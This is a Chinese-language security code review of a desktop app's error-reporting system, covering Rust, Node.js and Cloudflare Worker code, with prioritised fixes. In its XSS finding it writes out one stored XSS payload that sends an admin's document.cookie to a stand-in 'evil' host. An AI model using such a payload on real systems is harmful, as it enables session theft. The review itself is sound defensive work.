# Seahi-Serial 代码评审报告 — 错误上报系统

**评审日期**: 2026-07-27  
**评审范围**: 新增的错误上报系统全部代码  
**评审人**: UX Researcher (代码评审模式)

## 评审范围清单

| 文件 | 行数 | 角色 |
|------|------|------|
| `src-tauri/src/main.rs` (L1-110, L2562-2700) | ~150 | Rust 客户端：panic 捕获 + 错误上报 |
| `src-tauri/Cargo.toml` (L23, L27-28) | 3 | 依赖：sentry, chrono, reqwest |
| `server/error-server.js` | 607 | 自建错误收集服务（Node.js + SQLite） |
| `server/sentry-webhook.js` | 187 | Sentry → GitHub Issue 转发 |
| `cloudflare-worker/worker.js` | 471 | Cloudflare Worker 版错误收集服务 |
| `cloudflare-worker/schema.sql` | 32 | D1 数据库表结构 |
| `cloudflare-worker/deploy.sh` | 66 | 部署脚本 |
| `test-error-report.js` | 65 | 测试脚本（直连生产） |
| `test-server.js` | 117 | 本地 mock 服务器 |
| `src/index.html` (L5190-5198, L5453-5460) | ~20 | 前端全局错误捕获 |
| `.gitignore` | 31 | 缺失 .env 忽略 |

---

## 风险等级总览

| 等级 | 数量 | 含义 |
|------|------|------|
| 🔴 P0 严重 | 4 | 必须立即修复，存在已可利用的安全漏洞 |
| 🟠 P1 高危 | 6 | 上线前必须修复，存在安全/数据风险 |
| 🟡 P2 中危 | 9 | 影响稳定性或可维护性，下个迭代修复 |
| 🔵 P3 低危 | 6 | 代码质量改进，择机修复 |

---

## 🔴 P0 — 严重风险（立即修复）

### P0-1: XSS 漏洞 — Web UI 未转义字段

**位置**: `cloudflare-worker/worker.js` L378-380, L417-419, L435; `server/error-server.js` L483-485, L523-525, L541

**问题**: 错误列表和详情页里，`app_version`、`os`、`count` 字段直接拼入 HTML，未经过 `escapeHtml()`。只有 `error_message` 做了转义。

```javascript
// worker.js L378 — app_version 直接插入，未转义
'<td><span class="version-tag">' + (e.app_version || '-') + '</span></td>' +
'<td><span class="os-tag">' + (e.os || '-') + '</span></td>' +
'<td><span class="count-badge ' + countClass(e.count) + '">' + e.count + '</span></td>'
```

**攻击路径**: 攻击者 POST `/report`，payload 设为 `{ "app_version": "<img src=x onerror=fetch('https://evil/?c='+document.cookie)>" }`。管理员打开错误列表页即触发任意 JS 执行。

**影响**: Cloudflare Worker 公网暴露 → 任何人都可投毒 → 管理员查看时 XSS → 可窃取 Worker 域名下的数据、操控错误数据库。

**修复**:
```javascript
// 所有用户可控字段都必须转义
'<td><span class="version-tag">' + escapeHtml(e.app_version || '-') + '</span></td>' +
'<td><span class="os-tag">' + escapeHtml(e.os || '-') + '</span></td>' +
'<td><span class="count-badge ' + countClass(e.count) + '">' + escapeHtml(String(e.count)) + '</span></td>'
```

`test-server.js` L88-95 同样有此问题（`e.error`、`e.app_version`、`e.os` 全未转义）。

---

### P0-2: 无认证的上报端点 + 通配 CORS

**位置**: `worker.js` L17-21, L59; `error-server.js` L571-573

**问题**: `/report` 端点完全开放——无 API key、无 rate limit、无来源验证。CORS 设为 `Access-Control-Allow-Origin: '*'`，允许任何网站跨域 POST。

```javascript
// worker.js L17-21
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};
```

**影响**:
- 攻击者可灌入大量垃圾数据，污染错误统计
- Cloudflare D1 免费版每天 100K 行写入限额，可被恶意耗尽
- GET 接口（`/api/errors`）也设了通配 CORS，任何网站可读取你的全部错误数据（含堆栈、上下文）——信息泄露

**修复方案**:
1. `/report` 端点要求 `X-API-Key` header，客户端和服务器共享密钥
2. `/api/*` 端点 CORS 限制为管理面板域名或 `localhost`
3. 加入 rate limit（Cloudflare Worker 可用 `request.cf.rateLimit` 或在 D1 记录频率）

```javascript
// worker.js — 加入 API Key 验证
async function handleReport(request, DB, corsHeaders, env) {
  const apiKey = request.headers.get('X-API-Key');
  if (apiKey !== env.ERROR_API_KEY) {
    return new Response(JSON.stringify({ error: 'Unauthorized' }), 
      { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
  // ... 原有逻辑
}
```

客户端 `main.rs` 对应加上 header：
```rust
client.post(format!("{}/report", server_url))
    .header("X-API-Key", std::env::var("ERROR_API_KEY").unwrap_or_default())
    .json(&payload)
    .send();
```

---

### P0-3: 生产 Worker URL 硬编码 + 开发数据污染生产

**位置**: `main.rs` L46-47, L82

**问题**: 生产 Worker URL 写死在二进制里，且 `report_to_self_hosted` 无条件调用（不像 Sentry 那样只在 Release 模式初始化）。

```rust
// main.rs L46-47
let server_url = std::env::var("ERROR_SERVER_URL")
    .unwrap_or_else(|_| "https://seahi-error-server.seahi-mo.workers.dev".to_string());

// main.rs L82 — 无条件调用，Debug 模式也发
report_to_self_hosted(error, context);
```

**影响**:
- 开发调试时的所有错误都发往生产 Worker，污染真实错误数据
- 无法区分开发 vs 生产环境的数据
- 如果 Worker URL 变更，需要重新编译

**修复**:
```rust
fn report_to_self_hosted(error: &str, context: &str) {
    // Debug 模式不发往生产，除非显式设置 ERROR_SERVER_URL
    #[cfg(debug_assertions)]
    {
        if std::env::var("ERROR_SERVER_URL").is_err() {
            dbg_log("[SKIP] Debug 模式未设置 ERROR_SERVER_URL，跳过上报");
            return;
        }
    }
    
    let server_url = std::env::var("ERROR_SERVER_URL")
        .unwrap_or_else(|_| "https://seahi-error-server.seahi-mo.workers.dev".to_string());
    // ... 原有发送逻辑
}
```

---

### P0-4: `.env` 未被 `.gitignore` 忽略

**位置**: `.gitignore`（缺失条目）

**问题**: `.env.example` 里包含 `GITHUB_TOKEN=ghp_xxx` 模板。用户创建真实 `.env` 填入 token 后，`.gitignore` 没有忽略 `.env`，可能被意外提交到 GitHub。

**影响**: GitHub Token / Sentry DSN 泄露 → 攻击者可操作 GitHub 仓库（创建/关闭 Issue）、操作 Sentry 项目。

**修复**: 在 `.gitignore` 追加：
```
# 环境变量（含敏感信息）
.env
.env.local
.env.*.local

# 错误收集服务本地数据库
server/errors.db
server/errors.db-*

# 测试产物
.walkthrough/
```

---

## 🟠 P1 — 高危风险（上线前修复）

### P1-1: Sentry Webhook 签名验证被注释掉

**位置**: `server/sentry-webhook.js` L133-134

```javascript
// 验证 Webhook 签名（可选）
// const signature = req.headers['sentry-hook-signature'];
```

**问题**: 签名验证代码写好了但被注释。任何人都能伪造 Sentry webhook，通过 `handleWebhook` 往你的 GitHub 仓库创建任意 Issue。

**修复**: 取消注释并实现 HMAC 验证（Sentry 用 `X-Sentry-Hook-Signature` header，是 HMAC-SHA256 of body 用 webhook secret 做 key）。

---

### P1-2: 无 body 大小限制（DoS 风险）

**位置**: `error-server.js` L127-128; `sentry-webhook.js` L125-127; `test-server.js` L22-23

```javascript
req.on('data', chunk => body += chunk);  // 无限制累加
```

**问题**: 攻击者发送超大 body（如 1GB），`body` 字符串无限增长，导致内存耗尽。

**修复**:
```javascript
function parseBody(req, maxBytes = 1024 * 1024) {  // 默认 1MB
  return new Promise((resolve, reject) => {
    let body = '';
    let size = 0;
    req.on('data', chunk => {
      size += chunk.length;
      if (size > maxBytes) {
        reject(new Error('Body too large'));
        req.destroy();
        return;
      }
      body += chunk;
    });
    req.on('end', () => {
      try { resolve(JSON.parse(body)); } catch (e) { reject(e); }
    });
  });
}
```

---

### P1-3: `createdIssues` Map 无限增长（内存泄漏）

**位置**: `server/sentry-webhook.js` L23

```javascript
const createdIssues = new Map();  // 只增不删
```

**问题**: 长期运行的服务，Map 持续增长，最终 OOM。

**修复**: 用 LRU 或加 TTL 过期：
```javascript
const createdIssues = new Map();
const ISSUE_TTL = 24 * 60 * 60 * 1000; // 24小时

function checkAndSet(key, value) {
  // 清理过期项
  const now = Date.now();
  for (const [k, v] of createdIssues) {
    if (now - v.time > ISSUE_TTL) createdIssues.delete(k);
  }
  createdIssues.set(key, { number: value, time: now });
}
```

---

### P1-4: 哈希算法两套不一致

**位置**: `error-server.js` L120-123 vs `worker.js` L464-469

| 服务 | 算法 | 输入 |
|------|------|------|
| error-server.js | MD5 | `${error}\n${stack \|\| ''}` |
| worker.js | SHA-256 | `error + stack` |

**问题**: 同一个错误在两个服务产生不同 hash，迁移数据时去重失效。另外 MD5 已被弃用。

**修复**: 统一用 SHA-256，输入格式也统一：
```javascript
// 两处都改为
function generateHash(error, stack) {
  return crypto.createHash('sha256')
    .update(`${error}\n${stack || ''}`).digest('hex');
}
```

---

### P1-5: `error_details` 表无限制增长

**位置**: 两个服务的 `handleReport` 函数

**问题**: 每次重复上报都 INSERT 一条 detail 记录，无清理机制。高频错误（如循环里出错）会快速填满 D1 免费版 5GB 限额。

**修复**:
1. 每个 error 最多保留 100 条 detail（插入前检查数量，超了删最旧的）
2. 加定时清理任务（Cloudflare Worker 用 Cron Triggers）：
```sql
DELETE FROM error_details 
WHERE error_id IN (
  SELECT error_id FROM error_details 
  GROUP BY error_id HAVING COUNT(*) > 100
)
AND id NOT IN (
  SELECT id FROM error_details 
  WHERE error_id IN (
    SELECT error_id FROM error_details GROUP BY error_id HAVING COUNT(*) > 100
  ) ORDER BY created_at DESC LIMIT 100
)
```

---

### P1-6: `test_error_report` 命令在生产可用

**位置**: `main.rs` L2562-2571, L2697

```rust
#[tauri::command]
fn test_error_report() -> Result<String, String> {
    // ... 往生产服务器发测试错误
}
```

**问题**: 测试命令注册在 `invoke_handler` 里，Release 构建也包含。任何能打开 DevTools 的人都能反复调用，往生产错误服务器灌垃圾。

**修复**: 用条件编译限制为 Debug 模式：
```rust
#[cfg(debug_assertions)]
#[tauri::command]
fn test_error_report() -> Result<String, String> {
    // ...
}

// main() 里也要条件注册
.invoke_handler(tauri::generate_handler![
    // ... 其他命令
    #[cfg(debug_assertions)]
    test_error_report,
    report_js_error,
])
```

---

## 🟡 P2 — 中危风险（下个迭代修复）

### P2-1: 每次错误都 spawn 新线程

**位置**: `main.rs` L58

```rust
std::thread::spawn(move || {
    let client = reqwest::blocking::Client::builder()...
});
```

**问题**: 高频错误（如循环里连续出错）会瞬间创建大量线程，每个线程还新建 `reqwest::Client`（无法复用连接池）。极端情况下线程爆炸。

**修复**: 用 channel + 单独的上报线程：
```rust
use std::sync::mpsc;
use std::thread;

static ERROR_SENDER: once_cell::sync::Lazy<Option<mpsc::Sender<(String, String)>>> = 
    once_cell::sync::Lazy::new(|| {
        let (tx, rx) = mpsc::channel::<(String, String)>();
        thread::spawn(move || {
            let client = reqwest::blocking::Client::builder()
                .timeout(std::time::Duration::from_secs(5))
                .build().ok();
            if let Some(client) = client {
                while let Ok((error, context)) = rx.recv() {
                    let _ = client.post(/* ... */).send();
                }
            }
        });
        Some(tx)
    });

fn report_to_self_hosted(error: &str, context: &str) {
    if let Some(tx) = ERROR_SENDER.as_ref() {
        let _ = tx.send((error.to_string(), context.to_string()));
    }
}
```

---

### P2-2: panic 上报可能丢失

**位置**: `main.rs` L104-108

**问题**: panic 发生后 `report_error` spawn 线程发网络请求，但主线程可能在线程完成前就崩溃退出，导致 panic 错误丢失。

**修复**: panic 场景改为同步发送（阻塞最多 2 秒），或写入本地文件后在下次启动时补报。

---

### P2-3: 竞态条件 — 并发上报同一新错误

**位置**: 两个服务的 `handleReport`

**问题**: `SELECT` 检查 existing 和 `INSERT` 之间无事务。两个并发请求同时上报同一个新错误 → 都查不到 → 都 INSERT → `error_hash UNIQUE` 约束让第二个失败，但代码没处理这个错误。

**修复** (Cloudflare D1):
```javascript
// 用 batch 保证原子性
const result = await DB.prepare(
  'INSERT INTO errors (app_version, os, error_hash, error_message, stack_trace, context) VALUES (?, ?, ?, ?, ?, ?) ON CONFLICT(error_hash) DO UPDATE SET count = count + 1, last_seen = datetime(\'now\')'
).bind(app_version, os, errorHash, error, stack, context).run();
```

---

### P2-4: SQLite 数据库路径用相对路径

**位置**: `error-server.js` L25

```javascript
db = new sqlite3.Database('./errors.db');
```

**问题**: 依赖启动时的工作目录（CWD）。用 systemd / nodemon / PM2 启动时可能写到意外位置。

**修复**:
```javascript
const DB_PATH = path.join(__dirname, 'errors.db');
db = new sqlite3.Database(DB_PATH);
```

---

### P2-5: `sentry` 依赖增加 exe 体积

**位置**: `Cargo.toml` L27

**问题**: `sentry = "0.34"` 是重量级依赖（含 HTTP client、TLS、序列化等），即使用户不配置 SENTRY_DSN 也会编译进 exe。用户对 exe 体积敏感。

**修复**: 用 feature gate 或条件编译，只有启用 sentry feature 时才编译：
```toml
[features]
default = []
sentry = ["dep:sentry"]

[dependencies]
sentry = { version = "0.34", optional = true }
```

代码里用 `#[cfg(feature = "sentry")]` 包裹所有 sentry 相关调用。

---

### P2-6: `deploy.sh` 的 `sed -i` 不可重入

**位置**: `cloudflare-worker/deploy.sh` L44

```bash
sed -i "s/YOUR_DATABASE_ID/$DATABASE_ID/g" wrangler.toml
```

**问题**: 脚本失败重跑时，`wrangler.toml` 已被修改，`YOUR_DATABASE_ID` 不存在了。而且当前 `wrangler.toml` L9 已经有真实 database_id，说明已部署过——脚本再跑会报错。

**修复**: 用环境变量或单独的 `wrangler.dev.toml`，不原地修改文件。

---

### P2-7: `test-error-report.js` 直连生产 + Content-Length 错误

**位置**: `test-error-report.js` L4, L23

```javascript
const WORKER_URL = 'https://seahi-error-server.seahi-mo.workers.dev';
// ...
'Content-Length': data.length  // 应为 Buffer.byteLength(data)
```

**问题**: 测试脚本直连生产 Worker。`data.length` 是字符串长度，含多字节字符时与字节数不符。

**修复**: 改为从环境变量读取 URL，并用 `Buffer.byteLength`。

---

### P2-8: `generateHash` 里每次 `require('crypto')`

**位置**: `error-server.js` L121

```javascript
function generateHash(error, stack) {
  const crypto = require('crypto');  // 每次调用都 require
  return crypto.createHash('md5')...
}
```

**修复**: 提到文件顶部 `const crypto = require('crypto');`。

---

### P2-9: error-server.js 内存模式静默降级

**位置**: `error-server.js` L57-116

**问题**: `sqlite3` 未安装时 fallback 到内存模式，但内存模式的 `get`/`all` 实现非常简陋——不处理 `handleList` 的 WHERE 条件（搜索/筛选/分页部分失效），只返回假数据。用户不会收到任何提示说"搜索不工作因为没装 sqlite3"。

**修复**: 内存模式应在启动时打印明显警告，且 `handleList` 的内存实现至少要支持基本的搜索过滤。

---

## 🔵 P3 — 低危 / 代码质量

### P3-1: `db.run` 创建表无错误回调
**位置**: `error-server.js` L27-54。表创建失败无提示。加 callback 检查 `err`。

### P3-2: `db.run` 的 UPDATE/INSERT 无错误处理
**位置**: `error-server.js` L158-160, L174-175。第二个 `INSERT INTO error_details` 失败完全不知道。加 callback 记录日志。

### P3-3: 没有 graceful shutdown
**位置**: `error-server.js`。进程被杀时 SQLite 可能没正确关闭。加 `process.on('SIGINT')` 关闭 db。

### P3-4: CORS 对 GET 接口也设通配
**位置**: `error-server.js` L571。`/api/*` 的 CORS 应限制来源，不应 `*`。

### P3-5: `report_js_error` 的 context 拼接冗余
**位置**: `main.rs` L2576。`format!("frontend: {}", context)` 让 context 字段变长，不影响功能但显示不够清晰。

### P3-6: `testErrorReport` 前端函数未绑定 UI
**位置**: `index.html` L5454。定义了但无入口。好的一面是不会被误触发；如果需要开发测试入口，考虑加到 DevTools 菜单或隐藏按钮。

---

## 体验优化建议

### UX-1: 缺少用户隐私告知

**问题**: 应用在后台静默上报错误（含堆栈、上下文），用户完全不知情。这在 GDPR / 个保法下存在合规风险。

**建议**: 
- 首次启动时弹出隐私提示，告知会收集崩溃数据用于改进，提供"同意/拒绝"选项
- 在设置页加"错误上报"开关，默认开启但可关闭
- 上报内容不应包含用户串口数据（当前 `context` 字段可能包含敏感信息）

### UX-2: 错误管理 Web UI 缺少关键功能

**问题**: 当前的错误管理面板（worker.js / error-server.js 的 Web UI）只能查看，缺少：
- **错误状态管理**: 无法标记"已确认/已修复/已忽略"
- **批量操作**: 无法批量删除或归档
- **错误趋势图**: 只有数字统计，没有时间趋势可视化
- **导出功能**: 无法导出为 CSV/JSON

**建议**: 优先加"删除错误"和"标记已修复"功能，避免已解决的问题持续占用面板注意力。

### UX-3: `report_to_self_hosted` 可能影响应用启动性能

**问题**: panic hook 在 `main()` 最开始设置（L2623），如果启动早期就 panic，`report_error` 会 spawn 线程发网络请求。如果网络不通（如防火墙阻断），线程会等待 5 秒超时。

**建议**: panic 场景优先写本地文件，网络上报延迟到下次正常启动时补报。

### UX-4: 前端全局错误捕获缺少上下文

**位置**: `index.html` L5191-5198

```javascript
window.onerror = function(msg, src, line, col, err) {
    var ctx = (src||'').replace(/^.*[\\/]/,'') + ':' + line + ':' + col;
    try { invoke('report_js_error', { error: String(msg), context: ctx }); } catch(_) {}
};
```

**问题**: 只记录了文件位置，没记录：
- 用户当前操作（点击了什么按钮）
- 应用状态（当前连接的串口、波特率等）
- 用户 ID / 会话 ID（用于关联同一用户的多次错误）

**建议**: 在 `window.onerror` 里附加 `appState`（当前串口连接状态、激活的监视器数等），帮助复现问题。

---

## 修复优先级计划

### 第一批（立即修复 — 安全）
1. ✅ `.gitignore` 加 `.env`、`errors.db`（P0-4，5 分钟）
2. ✅ Web UI XSS 修复 — 所有字段过 `escapeHtml`（P0-1，30 分钟）
3. ✅ `test_error_report` 加 `#[cfg(debug_assertions)]`（P1-6，5 分钟）
4. ✅ `report_to_self_hosted` Debug 模式跳过（P0-3，10 分钟）

### 第二批（上线前 — 安全 + 稳定）
5. API Key 认证 + CORS 收紧（P0-2，1-2 小时）
6. body 大小限制（P1-2，20 分钟）
7. Sentry webhook 签名验证（P1-1，30 分钟）
8. 哈希算法统一（P1-4，15 分钟）

### 第三批（下个迭代 — 稳定性）
9. 线程池化错误上报（P2-1，1 小时）
10. D1 竞态修复用 `ON CONFLICT`（P2-3，20 分钟）
11. error_details 清理机制（P1-5，30 分钟）
12. sentry feature gate（P2-5，20 分钟）

### 第四批（体验）
13. 隐私告知弹窗（UX-1，1 小时）
14. 错误管理 UI 加删除/标记功能（UX-2，2 小时）
15. 前端错误上下文增强（UX-4，30 分钟）

---

## 方法学说明

本次评审采用**静态代码走查 + 数据流分析**：
- 逐文件阅读全部新增代码（共 ~1700 行）
- 追踪用户输入从入口（`/report`、Tauri command）到出口（HTML 渲染、SQL 执行、GitHub API）的完整路径
- 重点检查 OWASP Top 10 风险点：注入、XSS、失效认证、敏感数据泄露
- 结合项目上下文（Tauri 桌面应用、Windows-only、单人开发）评估实际风险

**评审局限**: 未执行动态测试（未实际发送攻击 payload 验证 XSS）。建议后续用 curl 发送含 `<script>` 的 payload 验证 P0-1。

---

**结论**: 错误上报系统功能完整、架构合理（双方案 + Cloudflare Worker 免费部署），但存在 4 个 P0 级安全问题需立即修复。其中 XSS（P0-1）和无认证端点（P0-2）在 Worker 公网暴露的情况下可被直接利用。建议在发布包含此功能的版本前完成第一批 + 第二批修复。
